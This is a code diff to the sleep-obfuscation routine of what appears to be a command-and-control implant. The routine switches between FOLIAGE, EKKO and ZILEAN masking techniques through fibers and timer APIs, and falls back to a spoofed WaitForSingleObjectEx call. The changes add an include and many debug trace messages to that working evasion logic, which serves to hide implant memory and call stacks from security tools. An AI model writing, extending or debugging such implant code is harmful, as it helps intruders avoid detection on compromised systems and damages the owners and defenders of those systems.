@@ -6,6 +6,7 @@
 #include <core/MiniStd.h>
 #include <core/Thread.h>
 
+#include <rpcndr.h>
 #include <ntstatus.h>
 
 UINT32 SleepTime(
@@ -78,15 +79,19 @@ VOID SleepObf(
     UINT32 TimeOut   = SleepTime();
     DWORD  Technique = Instance->Config.Implant.SleepMaskTechnique;
 
+    PRINTF( "SleepObf: ENTRY TimeOut=%u ms Technique=%d Threads=%d\n",
+            TimeOut, Technique, Instance->Threads )
+
     /* don't do any sleep obf. waste of resources */
     if ( TimeOut == 0 ) {
+        PUTS( "SleepObf: TimeOut=0, skipping sleep" )
         return;
     }
 
 #if _WIN64
 
     if ( Instance->Threads ) {
-        PRINTF( "Can't sleep obf. Threads running: %d\n", Instance->Threads )
+        PRINTF( "SleepObf: forcing technique=0 (no obf), Threads running: %d\n", Instance->Threads )
         Technique = 0;
     }
 
@@ -96,13 +101,21 @@ VOID SleepObf(
         case SLEEPOBF_FOLIAGE: {
             SLEEP_PARAM Param = { 0 };
 
+            PUTS( "SleepObf: dispatch -> FOLIAGE" )
             if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
+                PRINTF( "SleepObf: ConvertThreadToFiberEx OK Master=%p\n", Param.Master )
                 if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
+                    PRINTF( "SleepObf: CreateFiberEx OK Slave=%p, switching\n", Param.Slave )
                     Param.TimeOut = TimeOut;
                     Instance->Win32.SwitchToFiber( Param.Slave );
+                    PUTS( "SleepObf: returned from fiber, deleting" )
                     Instance->Win32.DeleteFiber( Param.Slave );
+                } else {
+                    PUTS( "SleepObf: CreateFiberEx FAILED" )
                 }
                 Instance->Win32.ConvertFiberToThread( );
+            } else {
+                PUTS( "SleepObf: ConvertThreadToFiberEx FAILED" )
             }
             break;
         }
@@ -112,7 +125,9 @@ VOID SleepObf(
         /* timer api based sleep obfuscation */
         case SLEEPOBF_EKKO:
         case SLEEPOBF_ZILEAN: {
+            PRINTF( "SleepObf: dispatch -> %s\n", Technique == SLEEPOBF_EKKO ? "EKKO" : "ZILEAN" )
             if ( ! TimerObf( TimeOut, Technique ) ) {
+                PUTS( "SleepObf: TimerObf FAILED, falling back to default" )
                 goto DEFAULT;
             }
             break;
@@ -121,6 +136,7 @@ VOID SleepObf(
 
         /* default */
         DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
+            PUTS( "SleepObf: dispatch -> WaitForSingleObjectEx (no obfuscation)" )
             SpoofFunc(
                 Instance->Modules.Kernel32,
                 IMAGE_SIZE( Instance->Modules.Kernel32 ),
@@ -140,4 +156,5 @@ VOID SleepObf(
 
 #endif
 
+    PUTS( "SleepObf: EXIT" )
 }
